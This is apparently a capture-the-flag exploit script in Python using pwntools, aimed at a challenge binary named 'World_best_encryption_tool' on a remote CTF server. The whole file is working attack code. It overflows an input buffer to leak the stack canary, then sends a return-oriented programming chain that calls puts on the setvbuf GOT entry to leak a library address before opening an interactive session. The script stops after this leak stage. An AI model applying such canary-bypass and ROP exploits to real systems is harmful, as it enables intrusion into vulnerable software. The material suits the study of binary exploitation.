from pwn import *
context.log_level = 'debug'

bina="./World_best_encryption_tool"
p=remote('ctf.j0n9hyun.xyz',3034)
#p=process(bina)
e=ELF(bina)

puts_plt=e.plt['puts']
puts_got=e.got['puts']
printf_plt=e.plt['printf']
printf_got=e.got['printf']
setvbuf_got=e.got['setvbuf']
main=e.symbols['main']
pr=0x004008e3

p.recvuntil('Your text)\n')
pay=b"A"*56+b"B"
p.sendline(pay)
p.recvuntil("AAAAAA")
canary=p.recv(8)
canary=u64(canary)-ord("B")
log.success(canary)
log.success("Canary leak: "+hex(canary))

p.recvuntil('Wanna encrypt other text? (Yes/No)')
p.sendline('Yes')

p.recvuntil('Your text)')
ropay=b"A"*0x38
ropay+=b"\x00"
ropay+=b"B"*0x3F
ropay+=p64(canary)
ropay+=b"A"*8
ropay+=p64(pr)
ropay+=p64(e.got['setvbuf'])
ropay+=p64(puts_plt)
ropay+=p64(main)
p.sendline(ropay)

p.recvuntil('Wanna encrypt other text? (Yes/No)')

p.interactive()

